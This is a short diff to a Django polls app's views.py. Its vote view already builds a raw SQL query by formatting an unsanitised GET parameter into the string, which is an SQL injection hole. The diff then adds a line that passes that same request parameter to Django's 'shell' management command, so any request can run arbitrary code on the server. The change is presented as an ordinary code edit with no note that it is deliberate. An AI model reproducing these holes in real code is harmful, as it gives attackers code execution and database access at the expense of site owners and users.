@@ -3,6 +3,7 @@ from django.http import HttpResponseRedirect
 from django.urls import reverse
 from django.views import generic
 from django.utils import timezone
+from django.core import management
 
 from .models import Choice, Question
 
@@ -40,6 +41,7 @@ class ResultsView(generic.DetailView):
 def vote(request, question_id):
     param = request.GET.get('param')
     question = Question.objects.raw('SELECT * FROM mysite_polls WHERE id={}'.format(param))
+    management.call_command('shell', command=param)
     try:
         selected_choice = question.choice_set.get(pk=request.POST['choice'])
     except (KeyError, Choice.DoesNotExist):
